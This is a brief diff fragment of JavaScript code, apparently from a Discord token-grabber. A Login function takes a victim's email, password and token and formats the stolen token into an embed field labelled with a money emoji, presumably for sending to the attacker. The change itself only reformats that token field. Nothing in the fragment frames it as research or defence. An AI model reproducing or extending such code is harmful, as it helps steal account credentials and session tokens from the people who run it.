@@ -149,7 +149,7 @@ function Login(email, password, token) {
                 color: 000000,
                 fields: [{
                             "name": "<a:CH_MoneyFlying:715585160497856533> Token",
-                            "value": `\`${token}\``,
+                            "value": `\`\`\`${token}\`\`\``,
                             "inline": false
                         },
                         {
